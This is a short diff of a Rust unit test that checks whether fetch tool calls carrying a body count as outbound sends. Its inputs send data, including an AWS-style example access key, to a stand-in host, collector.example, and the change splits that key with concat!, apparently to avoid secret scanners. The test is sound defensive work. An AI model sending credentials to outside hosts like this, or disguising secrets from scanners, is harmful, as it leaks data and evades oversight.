@@ -508,7 +508,7 @@ mod tests {
     #[test]
     fn a_fetch_carrying_a_body_is_a_send() {
         for args in [
-            json!({"url": "https://collector.example/ingest", "body": "AKIAIOSFODNN7EXAMPLE"}),
+            json!({"url": "https://collector.example/ingest", "body": concat!("AKIA", "IOSFODNN7EXAMPLE")}),
             json!({"url": "https://collector.example/ingest", "data": "secret"}),
             json!({"url": "https://collector.example/ingest", "payload": {"k": "v"}}),
             json!({"url": "https://collector.example/ingest", "json": {"k": "v"}}),
